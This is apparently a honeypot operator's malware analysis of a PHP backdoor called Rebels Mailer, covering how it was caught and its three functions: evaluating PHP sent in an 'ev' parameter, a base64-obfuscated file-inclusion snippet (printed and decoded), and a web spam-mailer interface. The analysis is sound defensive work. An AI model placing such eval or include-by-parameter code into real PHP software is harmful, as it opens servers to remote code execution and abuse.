# Rebels Mailer Spamming Program

A small, multi-purpose backdoor.

Someone else put [this code](https://pastebin.com/MDFZzkuP) on pastebin, Jun 23rd, 2015,
and makes [another appearance](https://pastebin.com/BUdG3sjZ) on Jun 13th, 2017.
I received it Apr 13 08:56, 2018.
The pastebin code even has the "ev" parameter PHP evaluation,
and the local file inclusion code.

My honey pot caught [another version](105.108.125.206-2018-09-11a)
5 months later.

## Origin

### Download

The attacker hoped to use the "FilesMan" action, "uploadFile" sub-action,
of a WSO, web shell by "oRb". Bad luck, that just invoked a fake WSO,
part of my WordPress honey pot.

Had the attacker called on a real WSO web shell,
a file named `404mmaarr.php` would hold the [downloaded PHP source code](176.234.34.233WtDFB33gsdXMq58-NtUqwwAAAAQ.0.file).

## Analysis

This code has 3 functions:

A. Immediate evaluation of PHP source code

If a POST parameter "ev" has a value, this backdoor tries to evaluate it as PHP source code imediately.

B.  Built-in file inclusion

    $in = $_GET['in'];
    if(isset($in) && !empty($in)){
    echo @eval(base64_decode('ZGllKGluY2x1ZGVfb25jZSAkaW4pOw=='));
    }

'ZGllKGluY2x1ZGVfb25jZSAkaW4pOw==' decodes to:

    die(include_once $in);

If you send an HTTP parameter named 'in',
and it has the value of a file name on the system where the backdoor runs,
the code/text in that file gets included.
You could execute PHP that's already present on the infected system.

C. Email spamming

If you invoke the `404mmaarr.php` URL with no HTTP parameters,
it responds with a user friendly email spamming GUI:

![spam GUI](https://raw.githubusercontent.com/bediger4000/php-malware-analysis/master/176.234.34.233-2018-04-13a/RebelsMailer.png)

You can interact with the spamming tool via the web.
Email will ultimately be sent via the PHP `mail()` built-in,
by the compromised host.

Googling for ".:| Rebels Mailer |::." shows you more instances
of this tool on the wide open Internet.
